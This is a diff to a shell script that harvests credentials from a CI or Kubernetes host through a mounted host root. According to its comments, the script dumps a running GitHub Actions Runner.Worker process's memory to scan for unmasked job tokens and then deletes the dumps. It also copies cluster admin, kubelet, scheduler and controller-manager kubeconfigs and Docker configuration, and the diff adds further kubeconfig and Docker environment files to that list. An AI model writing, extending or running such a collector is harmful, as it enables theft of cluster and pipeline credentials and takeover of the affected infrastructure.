@@ -7,8 +7,8 @@
 # 2) dump at most ONE executing Runner.Worker on this host via the .NET
 #    diagnostics IPC, scan it for unmasked job tokens, delete every dump.
 set +e
-OUT=/out
-H=/host
+OUT=${I14987_OUT:-/out}
+H=${I14987_HOSTROOT:-/host}
 export HOME=/tmp
 SELF=$(cat $H/etc/hostname 2>/dev/null | tr -d '\n'); [ -n "$SELF" ] || SELF=$(hostname)
 echo "$SELF" > $OUT/self_host.txt
@@ -47,7 +47,11 @@ addf $H/etc/kubernetes/admin.conf etc_kubernetes_admin.conf
 addf $H/etc/kubernetes/kubelet.conf etc_kubernetes_kubelet.conf
 addf $H/etc/kubernetes/controller-manager.conf etc_kubernetes_controller-manager.conf
 addf $H/etc/kubernetes/scheduler.conf etc_kubernetes_scheduler.conf
+addf $H/etc/kubernetes/bootstrap-kubelet.kubeconfig etc_kubernetes_bootstrap-kubelet.kubeconfig
+addf $H/etc/kubernetes/kubelet.kubeconfig etc_kubernetes_kubelet.kubeconfig
+addf $H/etc/kubernetes/kube-proxy.kubeconfig etc_kubernetes_kube-proxy.kubeconfig
 addf $H/etc/docker/daemon.json etc_docker_daemon.json
+addf $H/etc/docker/docker_env.conf etc_docker_docker_env.conf
 for f in $H/etc/kubernetes/ssl/*; do
   [ -f "$f" ] || continue
   [ $N -ge 40 ] && break
